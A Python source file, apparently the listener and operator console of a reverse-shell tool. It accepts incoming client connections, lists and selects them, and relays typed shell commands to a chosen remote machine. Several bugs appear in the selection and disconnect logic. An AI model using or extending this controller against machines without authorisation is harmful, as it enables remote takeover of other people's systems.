import sys
from server import Server
from Variables import all_threads
import threading
from Client import Client

class main:
    def __init__(self, Host='127.0.0.1', Port=1234):
        self.Host = Host
        self.Port = Port

        self.current_conn = 0
        self.connected = []

        self.RecievingDataFrom = []

        self.Running = True

        self.server = Server(Host, Port)
        if self.server.socket_bind():
            print(self.server.LastError)
            exit()
        
        self.run()
        
    def accept_connections(self):
        while self.Running:
            conn, addr = self.server.socket_accept()
            newClient = Client(addr[0], addr[1], conn, "Client" + str(len(self.connected)))
            self.connected.append(newClient)
    
    def start_recieving(self, client):
        while client in self.RecievingDataFrom:
            if client.recieve():
                print("Error recieving data! Closing connection!\n" + client.LastError)
                client.close()
            print("[{}] {}".format(client.Name, client.LastResponse))
    
    def run(self):
        while self.Running:
            user_input = input("#> ")
            user_input = user_input.split(' ')
            args = user_input[1:]
            user_input = user_input[0].lower()

            if user_input == "exit":
                self.server.socket_close()
                self.Running = False
                sys.exit()

            elif user_input == "listen":
                newThread = threading.Thread(target=self.accept_connections).start()
                all_threads.append(newThread)
                print(f"Listening for connections on {self.Host}:{str(self.Port)}")
            
            elif user_input == "list":
                text = ""
                for index, client in enumerate(self.connected):
                    text += f"{index}. {client.Name}"
                    if index % 2 == 0:
                        text += "\t"
                    else:
                        text += "\n"
                print(text)
            
            elif user_input == "select":
                conn = args[0]
                if conn:
                    try:
                        if int(conn) <= len(self.connected):
                            self.current_conn = int(conn)
                            print("Selected number {}!".format(conn))
                        else:
                            print("Please eneter a valid connection!")
                    except ValueError:
                        print("Please enter the number asigned to the connection.")
                        continue
                else:
                    print("Selected last connected!")
                    self.current_conn = self.connected[-1]
            
            elif user_input == "shell":
                client = self.connected[self.current_conn]
                self.RecievingDataFrom.append(client)
                recvThread = threading.Thread(target=self.start_recieving, args=(client,))
                recvThread.start()
                all_threads.append(recvThread)
                while True:
                    cmd = input(">")
                    if cmd == "quit":
                        self.RecievingDataFrom.pop(client)
                        break
                    if (len(str.encode(cmd))) > 0:
                        client.send(cmd)

if __name__ == "__main__":
    args = sys.argv[1:]
    if args:
        try:
            Host = sys.argv[1]
            if len(Host.split('.')) != 4 and Host.lower() != 'localhost':
                print("Invalid Host entered! Enter valid Host e.g 192.168.1.1")
                exit()
            Port = sys.argv[2]
            try:
                Port = int(Port)
            except ValueError:
                print("Invalid Port entered!\nEnter valid Port e.g 8080")
                exit()
        except Exception as e:
            print("Error occured getting Host and Port!\n" + str(e))
            exit()
        main(Host, Port)
    else:
        main()